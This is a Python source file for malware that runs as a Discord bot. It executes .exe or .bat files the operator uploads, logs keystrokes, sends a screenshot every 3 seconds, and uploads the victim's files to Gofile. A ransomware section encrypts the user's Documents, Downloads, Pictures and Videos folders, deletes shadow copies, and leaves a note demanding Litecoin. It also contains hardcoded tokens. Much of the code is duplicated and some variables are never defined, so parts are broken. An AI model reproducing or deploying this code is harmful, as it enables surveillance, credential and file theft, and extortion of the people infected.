import os
import discord
import subprocess
from discord.ext import commands, tasks
from PIL import ImageGrab
import io
import platform
from cryptography.fernet import Fernet
import requests
import cv2
import numpy as np
from datetime import datetime, timedelta
import asyncio
import pygetwindow as gw
import pyautogui
import time
import aiofiles
import aiohttp
import shutil
import pythoncom
from pynput import keyboard
import threading
import base64

last_keylog_message_id = "None"
last_keylog_timestamp = "None"

# Decrypting the token
key = b"XNVMkRPc1qP4Bq9C_OXAtYWD54rpUtJNpO_PICvFLII="  # Replace with your actual key
cipher_suite = Fernet(key)

encrypted_token = b"gAAAAABouGj2ioU6r5nWwx4MPC42YD4zvPVqYfFYKmRELhCwPu4a4PCam5O7xzVMgY4QdSJSnUgcuVfygaO-M4X__OnuC2Qw7H_hDhqdWXgi4-HRTorljLeo5EGJyMXOQnmc0ktWi9jIFQNKHeheNBEi5UAFY6BrHI9cX4y7YHB10Clk6u-RpG0="  # Replace with your actual encrypted token

# Decrypt the token
TOKEN = cipher_suite.decrypt(encrypted_token).decode()
print(f"Decrypted token: {TOKEN}")  # Debug statement

# Set up the bot
GUILD_ID = 1412825105817538563  # Replace this with your actual Guild ID
intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

# Directory to download files to
DOWNLOAD_DIR = f"C:\\Users\\{os.getlogin()}\\AppData\\Local\\Discord\\"
FILES_DIR = os.path.join(DOWNLOAD_DIR, "files")
print(f"Download directory: {DOWNLOAD_DIR}")  # Debug statement

# Ensure the download directory exists
if not os.path.exists(DOWNLOAD_DIR):
    os.makedirs(DOWNLOAD_DIR)
    print(f"Created download directory: {DOWNLOAD_DIR}")  # Debug statement

# Ensure the files directory exists
if not os.path.exists(FILES_DIR):
    os.makedirs(FILES_DIR)
    print(f"Created files directory: {FILES_DIR}")  # Debug statement

# Gofile API endpoint and your credentials
GOFILE_API_URL = "https://upload.gofile.io/uploadfile"
GOFILE_ACCOUNT_TOKEN = "GpM5Bh6RYXbYcs2Uvwn4a7dIdCB20UM5"  # Your Gofile account token
GOFILE_ACCOUNT_ID = "de7d5f38-3ce6-4763-b07d-2f17bc86703f"  # Your Gofile account ID

# Helper function to create or get the user's channel
async def get_or_create_channel(ctx, user_name):
    guild = bot.get_guild(GUILD_ID)  # Use the specific guild by ID
    # Check if a channel with the name already exists
    channel = discord.utils.get(guild.text_channels, name=user_name.lower())
    if not channel:
        # If the channel doesn't exist, create it
        channel = await guild.create_text_channel(user_name)
        print(f"Created channel: {channel.name}")  # Debug statement
    else:
        print(f"Channel already exists: {channel.name}")  # Debug statement
    return channel

# Function to upload a file to Gofile and get the download link
async def upload_to_gofile(file_path):
    print(f"Uploading file to Gofile: {file_path}")  # Debug statement
    if not os.path.exists(file_path):
        print(f"File does not exist: {file_path}")  # Debug statement
        return None

    async with aiofiles.open(file_path, 'rb') as file:
        data = await file.read()
        boundary = '----WebKitFormBoundary7MA4YWxkTrZu0gW'  # Example boundary
        headers = {
            'Authorization': f'Bearer {GOFILE_ACCOUNT_TOKEN}',
            'X-Request-Id': GOFILE_ACCOUNT_ID,
            'Content-Type': f'multipart/form-data; boundary={boundary}'
        }
        body = f'--{boundary}\r\n'.encode() + \
               f'Content-Disposition: form-data; name="file"; filename="{os.path.basename(file_path)}"\r\n'.encode() + \
               'Content-Type: application/octet-stream\r\n\r\n'.encode() + \
               data + \
               f'\r\n--{boundary}--\r\n'.encode()

        timeout = aiohttp.ClientTimeout(total=60)  # Increase timeout to 60 seconds
        async with aiohttp.ClientSession(timeout=timeout) as session:
            try:
                async with session.post(GOFILE_API_URL, data=body, headers=headers) as response:
                    response_data = await response.text()
                    print(f"API Response: {response_data}")  # Debug statement
                    if response.status == 200:
                        data = await response.json()
                        download_link = data.get('data', {}).get('downloadPage', '')
                        print(f"Upload successful. Download link: {download_link}")  # Debug statement
                        return download_link
                    else:
                        print(f"Upload failed. Status code: {response.status}")  # Debug statement
                        return None
            except aiohttp.ClientError as e:
                print(f"Client error: {e}")
                return None
            except asyncio.TimeoutError:
                print("The request timed out")
                return None

# Custom converter for handling directory paths with spaces
class PathConverter(commands.Converter):
    async def convert(self, ctx, argument):
        return argument

# Command to handle file sending
@bot.command()
async def send(ctx):
    # Check if the command is in the correct channel
    if ctx.channel.id != CHANNEL_ID:
        print(f"Command not in the correct channel. Expected {CHANNEL_ID}, got {ctx.channel.id}")  # Debug statement
        return

    if len(ctx.message.attachments) > 0:
        attachment = ctx.message.attachments[0]
        file_path = os.path.join(FILES_DIR, attachment.filename)
        print(f"Downloading file: {file_path}")  # Debug statement

        # Download the file
        await attachment.save(file_path)

        # Now run the downloaded file silently (e.g., .exe, .bat)
        try:
            if file_path.endswith(".bat") or file_path.endswith(".exe"):
                subprocess.run([file_path], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                embed = discord.Embed(title="File Execution", description=f"Executed {attachment.filename} successfully!", color=discord.Color.dark_red())
                await ctx.send(embed=embed)
                print(f"Executed file: {file_path}")  # Debug statement
            else:
                embed = discord.Embed(title="Unsupported File Type", description=f"Unsupported file type: {attachment.filename}", color=discord.Color.dark_red())
                await ctx.send(embed=embed)
        except Exception as e:
            embed = discord.Embed(title="Execution Failed", description=f"Failed to execute {attachment.filename}: {str(e)}", color=discord.Color.dark_red())
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="No File Attached", description="No file attached. Please attach a file to send.", color=discord.Color.dark_red())
        await ctx.send(embed=embed)

# Command to take a screenshot
@bot.command()
async def screenshot(ctx):
    # Check if the command is in the correct channel
    if ctx.channel.id != CHANNEL_ID:
        print(f"Command not in the correct channel. Expected {CHANNEL_ID}, got {ctx.channel.id}")  # Debug statement
        return

    # Take a screenshot using Pillow
    screenshot = ImageGrab.grab()
    # Save the screenshot to a BytesIO object
    byte_io = io.BytesIO()
    screenshot.save(byte_io, 'PNG')
    byte_io.seek(0)
    embed = discord.Embed(title="Screenshot", description="Here is the screenshot:", color=discord.Color.dark_red())
    embed.set_image(url="attachment://screenshot.png")
    await ctx.send(embed=embed, file=discord.File(byte_io, 'screenshot.png'))

# Command to list specific directories and their contents
@bot.command()
async def filelist(ctx):
    # Check if the command is in the correct channel
    if ctx.channel.id != CHANNEL_ID:
        print(f"Command not in the correct channel. Expected {CHANNEL_ID}, got {ctx.channel.id}")  # Debug statement
        return

    # Define the directories to list
    directories = ["Downloads", "Documents", "Videos", "Pictures"]

    # List all files and directories in the specified directories recursively
    file_list = []
    for dir_name in directories:
        dir_path = os.path.join(os.path.expanduser("~"), dir_name)
        if os.path.exists(dir_path):
            for root, dirs, files in os.walk(dir_path):
                for name in dirs:
                    file_list.append(os.path.join(root, name))
                for name in files:
                    file_list.append(os.path.join(root, name))

    # Split the file list into chunks of 3 embeds
    chunk_size = 3
    for i in range(0, len(file_list), chunk_size):
        chunk = file_list[i:i + chunk_size]
        file_list_str = "\n".join(chunk)
        embed = discord.Embed(title="File List", description=f"Files and directories in specified folders:\n{file_list_str}", color=discord.Color.dark_red())
        await ctx.send(embed=embed)

# Command to download a specific directory or file
@bot.command()
async def download(ctx, *, path: PathConverter):
    # Check if the command is in the correct channel
    if ctx.channel.id != CHANNEL_ID:
        print(f"Command not in the correct channel. Expected {CHANNEL_ID}, got {ctx.channel.id}")  # Debug statement
        return

    # Prepend the current user's home directory if the path does not start with a drive letter
    if not os.path.isabs(path):
        path = os.path.join(os.path.expanduser("~"), path)

    print(f"Checking path: {path}")  # Debug statement

    # Check if the path exists
    if os.path.exists(path):
        print(f"File exists: {path}")  # Debug statement
        if os.path.isdir(path):
            # List all files in the specified directory
            files = os.listdir(path)
            file_list = "\n".join([os.path.join(path, file) for file in files])
            embed = discord.Embed(title="Directory Content", description=f"Files in {path}:\n{file_list}", color=discord.Color.dark_red())
            await ctx.send(embed=embed)
        elif os.path.isfile(path):
            file_size = os.path.getsize(path)
            print(f"File size: {file_size} bytes")  # Debug statement
            file_extension = os.path.splitext(path)[1].lower()
            print(f"File extension: {file_extension}")  # Debug statement

            # Ensure the file is saved with its original name and extension
            base_name = os.path.basename(path)
            new_file_path = os.path.join(FILES_DIR, base_name)

            # Check if the file already exists in the files directory
            if not os.path.exists(new_file_path):
                # Upload the file to Gofile and get the download link
                download_link = await upload_to_gofile(path)
                if download_link:
                    embed = discord.Embed(title="File Uploaded", description=f"File {path} uploaded successfully. Download link: {download_link}", color=discord.Color.dark_red())
                    await ctx.send(embed=embed)
                else:
                    embed = discord.Embed(title="Upload Failed", description=f"Failed to upload {path}.", color=discord.Color.dark_red())
                    await ctx.send(embed=embed)
            else:
                print(f"File already exists: {new_file_path}")  # Debug statement
                embed = discord.Embed(title="File Already Exists", description=f"The file {base_name} already exists in the files directory.", color=discord.Color.dark_red())
                await ctx.send(embed=embed)
        else:
            embed = discord.Embed(title="Invalid Path", description=f"The path {path} is neither a file nor a directory.", color=discord.Color.dark_red())
            await ctx.send(embed=embed)
    else:
        print(f"File does not exist: {path}")  # Debug statement
        embed = discord.Embed(title="Path Not Found", description=f"The path {path} does not exist.", color=discord.Color.dark_red())
        await ctx.send(embed=embed)

# Command to list all available commands
@bot.command()
async def cmds(ctx):
    # Remove the help command from the list and prepend the prefix
    commands_list = [f"!{command.name}" for command in bot.commands if command.name != "help"]
    embed = discord.Embed(title="Available Commands", description="Here is a list of all available commands:", color=discord.Color.dark_red())
    embed.add_field(name="Commands", value="\n".join(commands_list), inline=False)
    await ctx.send(embed=embed)

# Override the default help command
bot.help_command = None

# Keylogger class
class Keylogger:
    def __init__(self):
        self.log = []
        self.last_message_id = None
        self.last_timestamp = None

    def on_press(self, key):
        try:
            char = key.char
            if char.isspace():
                char = " "
            self.log.append(char)
            print(char, end='', flush=True)
            if char == '\n':
                self.send_log()
        except AttributeError:
            if key == keyboard.Key.space:
                self.log.append(" ")
            elif key == keyboard.Key.enter:
                self.log.append("\n")
                self.send_log()
            else:
                self.log.append(f"[{key}]")

    def send_log(self):
        if self.log:
            log_content = ''.join(self.log)
            print(f"Sending log: {log_content}")  # Debug statement
            self.log = []
            # Send the log content to the Discord channel
            asyncio.run_coroutine_threadsafe(self.send_to_discord(log_content), bot.loop)

    async def send_to_discord(self, log_content):
        global last_keylog_message_id, last_keylog_timestamp
        channel = bot.get_channel(KEYS_CHANNEL_ID)
        if channel:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            message = await channel.send(f"Captured Keystrokes at {timestamp}: ```{log_content}```")
            self.last_message_id = message.id
            self.last_timestamp = timestamp
            last_keylog_message_id = message.id
            last_keylog_timestamp = timestamp
        else:
            print(f"Channel with ID {KEYS_CHANNEL_ID} not found!")  # Debug statement

# Start the keylogger
def start_keylogger():
    with keyboard.Listener(on_press=Keylogger().on_press) as listener:
        listener.join()

# Screen capturing task
@tasks.loop(seconds=3)  # Capture a screenshot every 3 seconds
async def capture_screenshot():
    screenshot = ImageGrab.grab()
    byte_io = io.BytesIO()
    screenshot.save(byte_io, 'PNG')
    byte_io.seek(0)
    file = discord.File(byte_io, 'screenshot.png')
    channel = bot.get_channel(SCREENSHOTS_CHANNEL_ID)
    if channel:
        # Generate a new timestamp for when the screenshot is sent
        screenshot_timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        embed = discord.Embed(title="Screenshot", description="Here is the screenshot:", color=discord.Color.dark_red())
        embed.set_image(url="attachment://screenshot.png")
        if last_keylog_message_id:
            embed.add_field(name="Last Keylog Message", value=f"[Message](https://discord.com/channels/{GUILD_ID}/{KEYS_CHANNEL_ID}/{last_keylog_message_id}) at {last_keylog_timestamp}", inline=False)
        else:
            embed.add_field(name="Last Keylog Message", value="None", inline=False)

        # Add the new timestamp to the embed
        embed.add_field(name="Screenshot Sent At", value=screenshot_timestamp, inline=False)

        await channel.send(embed=embed, file=file)
    else:
        print(f"Channel with ID {SCREENSHOTS_CHANNEL_ID} not found!")  # Debug statement

# On bot startup: Check and create the channel, ping @everyone in the corresponding channel
@bot.event
async def on_ready():
    print(f'Logged in as {bot.user}')

    # Get the desktop name or username to create the channel
    desktop_name = platform.node()  # This is the name of the PC
    channel_name = desktop_name or os.getlogin()  # Default to the user’s login name if desktop name is not found

    # Fetch the guild (server) by ID
    guild = bot.get_guild(GUILD_ID)  # Get the specific guild by ID
    if not guild:
        print(f"Guild with ID {GUILD_ID} not found!")
        return

    # Create or get the channel
    channel = await get_or_create_channel(guild, channel_name)

    global CHANNEL_ID
    CHANNEL_ID = channel.id  # Store the channel ID globally

    # Ping @everyone in the channel
    await channel.send(f"@everyone {desktop_name} has joined the server!")

# Command to handle file sending
@bot.command()
async def send(ctx):
    # Check if the command is in the correct channel
    if ctx.channel.id != CHANNEL_ID:
        print(f"Command not in the correct channel. Expected {CHANNEL_ID}, got {ctx.channel.id}")  # Debug statement
        return

    if len(ctx.message.attachments) > 0:
        attachment = ctx.message.attachments[0]
        file_path = os.path.join(FILES_DIR, attachment.filename)
        print(f"Downloading file: {file_path}")  # Debug statement

        # Download the file
        await attachment.save(file_path)

        # Now run the downloaded file silently (e.g., .exe, .bat)
        try:
            if file_path.endswith(".bat") or file_path.endswith(".exe"):
                subprocess.run([file_path], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
                embed = discord.Embed(title="File Execution", description=f"Executed {attachment.filename} successfully!", color=discord.Color.dark_red())
                await ctx.send(embed=embed)
                print(f"Executed file: {file_path}")  # Debug statement
            else:
                embed = discord.Embed(title="Unsupported File Type", description=f"Unsupported file type: {attachment.filename}", color=discord.Color.dark_red())
                await ctx.send(embed=embed)
        except Exception as e:
            embed = discord.Embed(title="Execution Failed", description=f"Failed to execute {attachment.filename}: {str(e)}", color=discord.Color.dark_red())
            await ctx.send(embed=embed)
    else:
        embed = discord.Embed(title="No File Attached", description="No file attached. Please attach a file to send.", color=discord.Color.dark_red())
        await ctx.send(embed=embed)

# Command to take a screenshot
@bot.command()
async def screenshot(ctx):
    # Check if the command is in the correct channel
    if ctx.channel.id != CHANNEL_ID:
        print(f"Command not in the correct channel. Expected {CHANNEL_ID}, got {ctx.channel.id}")  # Debug statement
        return

    # Take a screenshot using Pillow
    screenshot = ImageGrab.grab()
    # Save the screenshot to a BytesIO object
    byte_io = io.BytesIO()
    screenshot.save(byte_io, 'PNG')
    byte_io.seek(0)
    embed = discord.Embed(title="Screenshot", description="Here is the screenshot:", color=discord.Color.dark_red())
    embed.set_image(url="attachment://screenshot.png")
    await ctx.send(embed=embed, file=discord.File(byte_io, 'screenshot.png'))

# Command to list specific directories and their contents
@bot.command()
async def filelist(ctx):
    # Check if the command is in the correct channel
    if ctx.channel.id != CHANNEL_ID:
        print(f"Command not in the correct channel. Expected {CHANNEL_ID}, got {ctx.channel.id}")  # Debug statement
        return

    # Define the directories to list
    directories = ["Downloads", "Documents", "Videos", "Pictures"]

    # List all files and directories in the specified directories recursively
    file_list = []
    for dir_name in directories:
        dir_path = os.path.join(os.path.expanduser("~"), dir_name)
        if os.path.exists(dir_path):
            for root, dirs, files in os.walk(dir_path):
                for name in dirs:
                    file_list.append(os.path.join(root, name))
                for name in files:
                    file_list.append(os.path.join(root, name))

    # Split the file list into chunks of 3 embeds
    chunk_size = 3
    for i in range(0, len(file_list), chunk_size):
        chunk = file_list[i:i + chunk_size]
        file_list_str = "\n".join(chunk)
        embed = discord.Embed(title="File List", description=f"Files and directories in specified folders:\n{file_list_str}", color=discord.Color.dark_red())
        await ctx.send(embed=embed)

# Command to download a specific directory or file
@bot.command()
async def download(ctx, *, path: PathConverter):
    # Check if the command is in the correct channel
    if ctx.channel.id != CHANNEL_ID:
        print(f"Command not in the correct channel. Expected {CHANNEL_ID}, got {ctx.channel.id}")  # Debug statement
        return

    # Prepend the current user's home directory if the path does not start with a drive letter
    if not os.path.isabs(path):
        path = os.path.join(os.path.expanduser("~"), path)

    print(f"Checking path: {path}")  # Debug statement

    # Check if the path exists
    if os.path.exists(path):
        print(f"File exists: {path}")  # Debug statement
        if os.path.isdir(path):
            # List all files in the specified directory
            files = os.listdir(path)
            file_list = "\n".join([os.path.join(path, file) for file in files])
            embed = discord.Embed(title="Directory Content", description=f"Files in {path}:\n{file_list}", color=discord.Color.dark_red())
            await ctx.send(embed=embed)
        elif os.path.isfile(path):
            file_size = os.path.getsize(path)
            print(f"File size: {file_size} bytes")  # Debug statement
            file_extension = os.path.splitext(path)[1].lower()
            print(f"File extension: {file_extension}")  # Debug statement

            # Ensure the file is saved with its original name and extension
            base_name = os.path.basename(path)
            new_file_path = os.path.join(FILES_DIR, base_name)

            # Check if the file already exists in the files directory
            if not os.path.exists(new_file_path):
                # Upload the file to Gofile and get the download link
                download_link = await upload_to_gofile(path)
                if download_link:
                    embed = discord.Embed(title="File Uploaded", description=f"File {path} uploaded successfully. Download link: {download_link}", color=discord.Color.dark_red())
                    await ctx.send(embed=embed)
                else:
                    embed = discord.Embed(title="Upload Failed", description=f"Failed to upload {path}.", color=discord.Color.dark_red())
                    await ctx.send(embed=embed)
            else:
                print(f"File already exists: {new_file_path}")  # Debug statement
                embed = discord.Embed(title="File Already Exists", description=f"The file {base_name} already exists in the files directory.", color=discord.Color.dark_red())
                await ctx.send(embed=embed)
        else:
            embed = discord.Embed(title="Invalid Path", description=f"The path {path} is neither a file nor a directory.", color=discord.Color.dark_red())
            await ctx.send(embed=embed)
    else:
        print(f"File does not exist: {path}")  # Debug statement
        embed = discord.Embed(title="Path Not Found", description=f"The path {path} does not exist.", color=discord.Color.dark_red())
        await ctx.send(embed=embed)

# Command to list all available commands
@bot.command()
async def cmds(ctx):
    # Remove the help command from the list and prepend the prefix
    commands_list = [f"!{command.name}" for command in bot.commands if command.name != "help"]
    embed = discord.Embed(title="Available Commands", description="Here is a list of all available commands:", color=discord.Color.dark_red())
    embed.add_field(name="Commands", value="\n".join(commands_list), inline=False)
    await ctx.send(embed=embed)

# Override the default help command
bot.help_command = None

# Keylogger class
class Keylogger:
    def __init__(self):
        self.log = []
        self.last_message_id = None
        self.last_timestamp = None

    def on_press(self, key):
        try:
            char = key.char
            if char.isspace():
                char = " "
            self.log.append(char)
            print(char, end='', flush=True)
            if char == '\n':
                self.send_log()
        except AttributeError:
            if key == keyboard.Key.space:
                self.log.append(" ")
            elif key == keyboard.Key.enter:
                self.log.append("\n")
                self.send_log()
            else:
                self.log.append(f"[{key}]")

    def send_log(self):
        if self.log:
            log_content = ''.join(self.log)
            print(f"Sending log: {log_content}")  # Debug statement
            self.log = []
            # Send the log content to the Discord channel
            asyncio.run_coroutine_threadsafe(self.send_to_discord(log_content), bot.loop)

    async def send_to_discord(self, log_content):
        global last_keylog_message_id, last_keylog_timestamp
        channel = bot.get_channel(KEYS_CHANNEL_ID)
        if channel:
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            message = await channel.send(f"Captured Keystrokes at {timestamp}: ```{log_content}```")
            self.last_message_id = message.id
            self.last_timestamp = timestamp
            last_keylog_message_id = message.id
            last_keylog_timestamp = timestamp
        else:
            print(f"Channel with ID {KEYS_CHANNEL_ID} not found!")  # Debug statement

# Start the keylogger
def start_keylogger():
    with keyboard.Listener(on_press=Keylogger().on_press) as listener:
        listener.join()

# Screen capturing task
@tasks.loop(seconds=3)  # Capture a screenshot every 3 seconds
async def capture_screenshot():
    screenshot = ImageGrab.grab()
    byte_io = io.BytesIO()
    screenshot.save(byte_io, 'PNG')
    byte_io.seek(0)
    file = discord.File(byte_io, 'screenshot.png')
    channel = bot.get_channel(SCREENSHOTS_CHANNEL_ID)
    if channel:
        # Generate a new timestamp for when the screenshot is sent
        screenshot_timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        embed = discord.Embed(title="Screenshot", description="Here is the screenshot:", color=discord.Color.dark_red())
        embed.set_image(url="attachment://screenshot.png")
        if last_keylog_message_id:
            embed.add_field(name="Last Keylog Message", value=f"[Message](https://discord.com/channels/{GUILD_ID}/{KEYS_CHANNEL_ID}/{last_keylog_message_id}) at {last_keylog_timestamp}", inline=False)
        else:
            embed.add_field(name="Last Keylog Message", value="None", inline=False)

        # Add the new timestamp to the embed
        embed.add_field(name="Screenshot Sent At", value=screenshot_timestamp, inline=False)

        await channel.send(embed=embed, file=file)
    else:
        print(f"Channel with ID {SCREENSHOTS_CHANNEL_ID} not found!")  # Debug statement

# Ransomware functionality
def encrypt_files(directory, key):
    cipher_suite = Fernet(key)
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as f:
                data = f.read()
            encrypted_data = cipher_suite.encrypt(data)
            with open(file_path, 'wb') as f:
                f.write(encrypted_data)
            print(f"Encrypted: {file_path}")  # Debug statement

def decrypt_files(directory, key):
    cipher_suite = Fernet(key)
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as f:
                data = f.read()
            decrypted_data = cipher_suite.decrypt(data)
            with open(file_path, 'wb') as f:
                f.write(decrypted_data)
            print(f"Decrypted: {file_path}")  # Debug statement

def disable_system_recovery():
    try:
        for drive in 'CDEFGHIJKLMNOPQRSTUVWXYZ':
            drive_letter = drive + ':\\'
            if os.path.exists(drive_letter):
                subprocess.run(['wmic', 'ShadowCopy', 'delete', f'/NoInteractive'], check=True)
                print(f"Disabled system recovery for {drive_letter}")  # Debug statement
    except subprocess.CalledProcessError as e:
        print(f"Error disabling system recovery: {e}")  # Debug statement

# Delay execution by 60 seconds
time.sleep(60)

# Directories to encrypt
directories = ["C:\\Users\\{}\\Documents".format(os.getlogin()),
               "C:\\Users\\{}\\Downloads".format(os.getlogin()),
               "C:\\Users\\{}\\Pictures".format(os.getlogin()),
               "C:\\Users\\{}\\Videos".format(os.getlogin())]

# Encrypt files in the specified directories
for directory in directories:
    encrypt_files(directory, key)

# Disable system recovery
disable_system_recovery()

# Command to handle ransomware encryption
@bot.command()
async def encrypt(ctx):
    # Check if the command is in the correct channel
    if ctx.channel.id != CHANNEL_ID:
        print(f"Command not in the correct channel. Expected {CHANNEL_ID}, got {ctx.channel.id}")  # Debug statement
        return

    # Directories to encrypt
    directories = ["C:\\Users\\{}\\Documents".format(os.getlogin()),
                   "C:\\Users\\{}\\Downloads".format(os.getlogin()),
                   "C:\\Users\\{}\\Pictures".format(os.getlogin()),
                   "C:\\Users\\{}\\Videos".format(os.getlogin())]

    # Encrypt files in the specified directories
    for directory in directories:
        encrypt_files(directory, key)

    # Disable system recovery
    disable_system_recovery()

    embed = discord.Embed(title="Encryption Completed", description="Files have been encrypted successfully. A ransom note has been placed in each encrypted directory.", color=discord.Color.dark_red())
    await ctx.send(embed=embed)

# Function to create a ransom note
def create_ransom_note(directory, key):
    ransom_note_content = (
        "Your files have been encrypted!\n\n"
        "To decrypt your files, please follow these instructions:\n"
        "1. Open Discord and DM iimatea5 with the message 'I need to decrypt my files'.\n"
        "2. Send exactly 50$ to the following Litecoin (LTC) address: LNj4aUCDo7XnAHs5ZzRP3jBESPFUwEo892\n"
        "3. Wait for further instructions from iimatea5.\n\n"
        "Your encryption key: {}\n"
        "Do not modify or delete this file. It is essential for decryption.\n"
    ).format(key.decode())

    ransom_note_path = os.path.join(directory, "RANSOM_NOTE.txt")
    with open(ransom_note_path, 'w') as f:
        f.write(ransom_note_content)
    print(f"Ransom note created at: {ransom_note_path}")  # Debug statement

# Modify the encrypt_files function to create a ransom note in each directory
def encrypt_files(directory, key):
    cipher_suite = Fernet(key)
    for root, dirs, files in os.walk(directory):
        for file in files:
            file_path = os.path.join(root, file)
            with open(file_path, 'rb') as f:
                data = f.read()
            encrypted_data = cipher_suite.encrypt(data)
            with open(file_path, 'wb') as f:
                f.write(encrypted_data)
            print(f"Encrypted: {file_path}")  # Debug statement

    # Create a ransom note in the encrypted directory
    create_ransom_note(directory, key)

# Run the bot
bot.run(TOKEN)
